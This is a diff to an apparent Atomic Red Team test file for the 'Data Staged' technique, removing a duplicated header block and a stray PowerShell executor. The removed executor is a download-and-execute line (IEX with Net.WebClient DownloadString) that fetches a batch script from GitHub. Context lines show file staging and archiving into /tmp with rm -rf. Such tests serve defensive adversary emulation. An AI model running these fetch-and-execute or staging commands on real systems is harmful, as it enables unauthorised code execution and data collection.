@@ -7,15 +7,6 @@ atomic_tests:
   description: |
     Utilize powershell to download discovery.bat and save to a local file
 
-  supported_platforms:---
-attack_technique: T1074
-display_name: Data Staged
-
-atomic_tests:
-- name: Stage data from Discovery.bat
-  description: |
-    Utilize powershell to download discovery.bat and save to a local file
-
   supported_platforms:
     - windows
 
@@ -104,10 +95,3 @@ atomic_tests:
       find {{ path }} -name '*{{ extension }}' -exec cp -prv '{}' '/tmp/staging' ';'
       tar -zcvf /tmp/staging.tar.gz /tmp/staging/
       rm -rf /tmp/staging
-
-    - windows
-
-  executor:
-    name: powershell
-    command: |
-      powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/Discovery.bat')" > c:\windows\pi.log
